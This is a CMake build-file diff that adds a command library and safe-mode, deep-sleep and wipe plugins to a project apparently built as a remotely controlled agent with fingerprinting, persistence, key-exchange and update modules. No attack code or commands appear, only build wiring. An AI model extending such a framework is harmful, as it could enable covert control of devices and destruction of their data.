@@ -4,16 +4,26 @@ set(CMAKE_CXX_STANDARD 17)
 find_package(OpenSSL REQUIRED)
 find_package(CURL REQUIRED)
 
+add_library(CommandCore STATIC src/CommandRegistry.cpp)
+
+
 add_library(FingerprintModule SHARED src/FingerprintModule.cpp src/Fingerprint.cpp)
 add_library(CommandHandler SHARED src/CommandHandler.cpp)
-target_link_libraries(CommandHandler CURL::libcurl)
+target_link_libraries(CommandHandler CURL::libcurl CommandCore)
 add_library(UpdateHandler SHARED src/UpdateHandler.cpp)
 add_library(PersistenceModule SHARED src/PersistenceModule.cpp)
 add_library(KeyExchange SHARED src/KeyExchange.cpp)
 target_link_libraries(KeyExchange OpenSSL::Crypto CURL::libcurl)
 
+add_library(CmdSafeMode SHARED src/CommandSafeMode.cpp)
+add_library(CmdDeepSleep SHARED src/CommandDeepSleep.cpp)
+add_library(CmdWipe SHARED src/CommandWipe.cpp)
+target_link_libraries(CmdWipe CommandCore)
+target_link_libraries(CmdDeepSleep CommandCore)
+target_link_libraries(CmdSafeMode CommandCore)
+
 add_executable(agent src/main.cpp src/Loader.cpp src/Globals.cpp src/Wipe.cpp)
-target_link_libraries(agent dl OpenSSL::Crypto CURL::libcurl)
+target_link_libraries(agent dl OpenSSL::Crypto CURL::libcurl CommandCore)
 
 install(TARGETS agent DESTINATION bin)
-install(TARGETS FingerprintModule CommandHandler UpdateHandler KeyExchange PersistenceModule DESTINATION plugins)
+install(TARGETS FingerprintModule CommandHandler UpdateHandler KeyExchange PersistenceModule CmdSafeMode CmdDeepSleep CmdWipe DESTINATION plugins)
